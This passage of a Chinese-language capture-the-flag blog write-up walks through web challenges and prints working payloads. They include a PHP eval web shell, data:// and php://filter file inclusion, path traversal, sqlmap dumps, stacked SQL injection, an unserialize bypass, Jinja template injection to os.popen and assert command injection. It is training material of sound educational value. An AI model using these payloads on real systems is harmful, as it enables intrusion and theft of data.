class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">&quot;php://&quot;</span>)) &#123;<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php://&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$page</span>);<br>&#125;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了 <code>php://</code></p><p><code>?page=data://text/plain,&lt;?php system(&quot;cat%20fl4gisisish3r3.php&quot;);?&gt;</code></p><p><img src="/posts/df9d333d/image-20240322205016669.png" srcset="/img/loading.gif" lazyload alt="image-20240322205016669"></p><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>无过滤文件上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">2333</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传得到路径 <code>upload/1711112145.2.php</code></p><p><img src="/posts/df9d333d/image-20240322205701059.png" srcset="/img/loading.gif" lazyload alt="image-20240322205701059"></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>F12</p><p><img src="/posts/df9d333d/image-20240322211334012.png" srcset="/img/loading.gif" lazyload alt="image-20240322211334012"></p><ul><li>source.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>hint.txt</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag not here, and flag in ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p>其中</p><p><img src="/posts/df9d333d/image-20240322212105518.png" srcset="/img/loading.gif" lazyload alt="image-20240322212105518"></p><p>传入 <code>page</code> 后面追加 <code>?</code></p><p>比如传入 <code>page=hint.php</code> 则相当于</p><p><code>mb_strpos(&quot;hint.php?&quot;,&quot;?&quot;)</code></p><p><code>mb_substr(&quot;hint.php&quot;, 0, &quot;hint.php&quot;)</code></p><p>所以我们可以手动传入带 <code>?</code> 的 page</p><p><code>source.php?/../../../../ffffllllaaaagggg</code></p><ul><li>include 的时候会把 <code>source.php?</code> 也看成目录，所以需要四个 <code>../</code></li><li>目录猜测是 <code>/var/www/html</code></li></ul><h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>sql注入</p><p>单引号写入，回车发现报错，猜测 sql注入</p><p>sqlmap启动</p><p><code>py sqlmap.py http://61.147.171.105:57816/ --forms --batch -dbs</code></p><p><img src="/posts/df9d333d/image-20240322214223337.png" srcset="/img/loading.gif" lazyload alt="image-20240322214223337"></p><p><code>&gt;py sqlmap.py http://61.147.171.105:57816/ --forms --batch -D news --tables</code></p><p><img src="/posts/df9d333d/image-20240322214240694.png" srcset="/img/loading.gif" lazyload alt="image-20240322214240694"></p><p><code>py sqlmap.py http://61.147.171.105:57816/ --forms --batch -D news -T secret_table --columns</code></p><p><img src="/posts/df9d333d/image-20240322214257497.png" srcset="/img/loading.gif" lazyload alt="image-20240322214257497"></p><p><code>py sqlmap.py http://61.147.171.105:57816/ --forms --batch -D news -T secret_table -C &quot;fl4g&quot; --dump</code></p><p><img src="/posts/df9d333d/image-20240322214315229.png" srcset="/img/loading.gif" lazyload alt="image-20240322214315229"></p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化，过滤了 形如<code>O:123:</code>、<code>C:123:</code>的前缀</p><p>首先绕过 <code>__wakeup</code></p><ul><li>在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过。</li></ul><p>其次是正则，这里可以在前缀的数字前加上 <code>+</code> 绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;fl4g.php&quot;</span>);<br><span class="hljs-variable">$a</span> =  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// echo $a;</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;Demo&quot;:1&#x27;</span>, <span class="hljs-string">&#x27;&quot;Demo&quot;:2&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// echo $a;</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// echo $a;</span><br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">// TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322215129199.png" srcset="/img/loading.gif" lazyload alt="image-20240322215129199"></p><h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>输入 <code>&#39;</code> 发现报错</p><p>尝试 <code>1&#39; union select 1,2,3 #</code></p><p>返回 <code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>尝试堆叠注入</p><p><code>1&#39;;show databases;#</code></p><p><img src="/posts/df9d333d/image-20240322220046279.png" srcset="/img/loading.gif" lazyload alt="image-20240322220046279"></p><p><code>1&#39;;show tables ;#</code></p><p><img src="/posts/df9d333d/image-20240322220125992.png" srcset="/img/loading.gif" lazyload alt="image-20240322220125992"></p><p><code>1&#39;;show columns from `1919810931114514`;#</code></p><p><img src="/posts/df9d333d/image-20240322220633717.png" srcset="/img/loading.gif" lazyload alt="image-20240322220633717"></p><p>看了 wp，发现可以使用 <code>handler</code></p><p><code>1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#</code></p><p><img src="/posts/df9d333d/image-20240322221227157.png" srcset="/img/loading.gif" lazyload alt="image-20240322221227157"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span>=<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$str</span>);<br>    <span class="hljs-comment">// echo $_o;</span><br>        <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;<br>       <br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)+<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);<br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;   <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_</span>)));<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$miwen</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$miwen</span>)));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)-<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);<br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;   <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_</span>);<br>&#125;<br><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-variable">$miwen</span>));<br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322222156165.png" srcset="/img/loading.gif" lazyload alt="image-20240322222156165"></p><h2 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h2><p>如题 SSTI</p><p>访问网址，没东西</p><p>猜测路径是注入点</p><p><code>&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code> 我们需要 os 模块，故寻找 <code>warnings.catch_warnings</code></p><p>在 [59] 位找到</p><p>构造 <code>&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()&#125;&#125;</code></p><p><img src="/posts/df9d333d/image-20240322223326989.png" srcset="/img/loading.gif" lazyload alt="image-20240322223326989"></p><p><img src="/posts/df9d333d/image-20240322223411592.png" srcset="/img/loading.gif" lazyload alt="image-20240322223411592"></p><h2 id="inget"><a href="#inget" class="headerlink" title="inget"></a>inget</h2><p>没想到是 sql，一点回显没有</p><p><code>http://61.147.171.105:53357/?id=1&#39; or &#39;1&#39;=&#39;1</code> 即可</p><p><img src="/posts/df9d333d/image-20240322223801462.png" srcset="/img/loading.gif" lazyload alt="image-20240322223801462"></p><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>点击发现 <code>?page</code> 参数，猜测目录穿越</p><p>发现屏蔽了 <code>.</code></p><p><img src="/posts/df9d333d/image-20240322224119673.png" srcset="/img/loading.gif" lazyload alt="image-20240322224119673"></p><p>访问 <code>page=flag</code> 为空白页面</p><p>猜测应该有什么目录，使用 dirsearch</p><p>发现 <strong>git泄露</strong></p><p><img src="/posts/df9d333d/image-20240322224500652.png" srcset="/img/loading.gif" lazyload alt="image-20240322224500652"></p><p>使用 <strong>githack</strong> 下载</p><p><img src="/posts/df9d333d/image-20240322224700471.png" srcset="/img/loading.gif" lazyload alt="image-20240322224700471"></p><p>得到 index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>	<span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</code> 明显存在拼接漏洞</p><p>所以传入 <code>?page=&#39;.system(&#39;whoami&#39;).&#39;</code> 即可</p><p><img src="/posts/df9d333d/image-20240322225442600.png" srcset="/img/loading.gif" lazyload alt="image-20240322225442600"></p><h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>输入 127.0.0.1 得到 ping 数据回显</p><p><img src="/posts/df9d333d/image-20240319210549168.png" srcset="/img/loading.gif" lazyload alt="image-20240319210549168"></p><p>尝试管道符号截断发现有WAF</p><p>多次尝试无果，查询wp</p><p>发现</p><ul><li>Django使用的是gbk编码，超过%F7的编码不在gbk中有意义</li><li>当 <code>CURLOPT_SAFE_UPLOAD</code> 为 true 时，如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求，来读取文件。</li></ul><p>尝试复现</p><p>输入 <code>/index.php?url=%80</code> 得到报错</p><p>可得敏感信息</p><p><img src="/posts/df9d333d/image-20240319211814443.png" srcset="/img/loading.gif" lazyload alt="image-20240319211814443"></p><p>再通过<code>@</code>拼接路径得到<code>@/opt/api/database.sqlite3</code></p><p>搜索关键词可得<img src="/posts/df9d333d/image-20240319211950188.png" srcset="/img/loading.gif" lazyload alt="image-20240319211950188"></p><h2 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h2><p>文件上传</p><p><img src="/posts/df9d333d/image-20240319212937464.png" srcset="/img/loading.gif" lazyload alt="image-20240319212937464"></p><p><code>file_get_contents($file2) === &quot;hello ctf&quot;</code> 可以使用 <code>php://input</code> 同时 post 数据绕过</p><p>直接 <code>include(flag.php)</code> 发现无flag回显，猜测在注释里</p><p>于是通过base64回显</p><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXs1YmUxM2IxOWNhNWRjODhkMTNiODA0ZjYyNWNjYzg1NH0=<br>&lt;?php<br>echo &quot;WRONG WAY!&quot;;<br>// $flag = cyberpeace&#123;5be13b19ca5dc88d13b804f625ccc854&#125;<br></code></pre></td></tr></table></figure><h2 id="fileinclude"><a href="#fileinclude" class="headerlink" title="fileinclude"></a>fileinclude</h2><p>同样文件上传</p><p>F12 得到注释的 php</p><p><img src="/posts/df9d333d/image-20240319213707783.png" srcset="/img/loading.gif" lazyload alt="image-20240319213707783"></p><p>思路很清晰了，同样通过base64回显</p><p><code>php://filter/read=convert.base64-encode/resource=flag</code>拼接<code>.php</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2NmZTNkZDdiNDBmM2MzMmJlYjI3MjA1ZmYzMjM2NDJlfSI7DQo/Pg==<br>&lt;?php<br>$flag=&quot;cyberpeace&#123;cfe3dd7b40f3c32beb27205ff323642e&#125;&quot;;<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>一个个点打开 <strong>设备维护中心</strong></p><p>发现 <code>index.php?page=</code> 接口</p><p>猜测路径穿越漏洞</p><p><code>index.php?page=/etc/passwd</code></p><p>得到</p><p><img src="/posts/df9d333d/image-20240319231504827.png" srcset="/img/loading.gif" lazyload alt="image-20240319231504827"></p><p>尝试 <code>php://filter/read=convert.base64-encode/resource=index.php</code> 得到</p><details><summary>index.html</summary><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 